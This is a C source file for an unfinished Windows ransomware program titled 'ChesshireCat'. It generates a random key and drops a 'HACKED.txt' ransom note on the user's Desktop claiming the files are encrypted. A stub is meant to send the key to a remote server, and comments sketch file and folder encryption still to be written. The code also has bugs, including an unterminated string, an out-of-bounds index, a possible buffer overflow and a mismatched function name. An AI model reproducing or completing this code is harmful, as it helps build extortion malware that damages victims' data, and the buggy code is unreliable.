/*_________ .__                  .__    .__               _________         __
\_   ___ \|  |__   ____   _____|  |__ |__|______   ____ \_   ___ \_____ _/  |_
/    \  \/|  |  \_/ __ \ /  ___/  |  \|  \_  __ \_/ __ \/    \  \/\__  \\   __\
\     \___|   Y  \  ___/ \___ \|   Y  \  ||  | \/\  ___/\     \____/ __ \|  |
 \______  /___|  /\___  >____  >___|  /__||__|    \___  >\______  (____  /__|
        \/     \/     \/     \/     \/                \/        \/     \/
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <Windows.h>
#include <Lmcons.h>

char *createPassword(int lengthPass);
void createMessage();
void sendPassword(char *passwd);

int main(){
    srand(time(NULL));
    char *toto = createPassword(10);
    printf("%s", toto);
    free(toto);
//    createMessage();
    return 0;
}

//Generate Password
char *createPassword(int lengthPass){
    int i;
    const char passBuilder[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
    char *createdPasswd = NULL;
    createdPasswd = malloc(lengthPass*sizeof(char));
    for( i = 0; i < lengthPass; i++ ){
        createdPasswd[i] = passBuilder[(rand()%(strlen(passBuilder))+1)] ;
    }
    return createdPasswd;

}

//Create a message on the Desktop
void createMessage(){
    char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserName(username, &username_len);

    char path[60] ={ NULL } ;
    strcat(path, "C:\\Users\\");
    strcat(path, username);
    strcat(path, "\\Desktop\\HACKED.txt");

    char message[] = "U have been hacked. All of your files have been crypted.";
    FILE *file = fopen(path, "w");
    fprintf(file, "%s\n" ,message);
    fclose(file);
}

//Send password to server
void SendPassword(char *passwd){
/*
    create a socket
    lookup the IP address
    open the socket
    send the request
    wait for the response
    close the socket
    https://stackoverflow.com/questions/22077802/simple-c-example-of-doing-an-http-post-and-consuming-the-response
*/
    int port = 80;
    char *host = "api.somesite.com";
    char *info = "POST /apikey=%s&command=%s HTTP/1.0\r\n\r\n";



}


//
//
//Encrypt file
//Encrypt Folder
//Algorithme cryptage ( AEncrypte, Clef)
